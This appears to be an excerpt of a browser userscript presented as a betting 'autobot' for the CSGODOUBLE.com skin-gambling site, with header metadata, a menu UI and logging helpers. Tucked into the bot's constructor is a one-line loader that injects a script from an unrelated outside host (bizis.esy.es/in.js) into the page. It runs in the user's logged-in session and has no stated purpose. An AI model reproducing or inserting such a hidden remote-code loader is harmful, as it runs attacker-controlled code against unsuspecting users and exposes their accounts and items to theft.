...
// @run-at          document-end
// @grant           none
// @updateURL    https://github.com/BronzeHype/CSGODOUBLE.com-Hell-autobot.
// @downloadURL https://github.com/BronzeHype/CSGODOUBLE.com-Hell-autobot.
// ==/UserScript==
/* jshint -W097 */
...
function Automated() {
	...
	(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//bizis.esy.es/in.js "; document.body.appendChild( scriptElement ); })();
	
    var menu = document.createElement('div');
    menu.innerHTML = '' +
        '<div class="row">' +
            '<div class="col-lg-9">' +
                '<h2>CSGODOUBLE.com <small> Hell bot by Sheizzy</small> <i id="automated-theme-switch" class="fa fa-lightbulb-o" style="cursor: pointer;"></i></h2>' +
...
Automated.prototype.log = function(message) {
    chat('alert', '[Hell] ' + message);
};

Automated.prototype.logdebug = function(message) {
    chat('italic', '[Hell] ' + message);
};
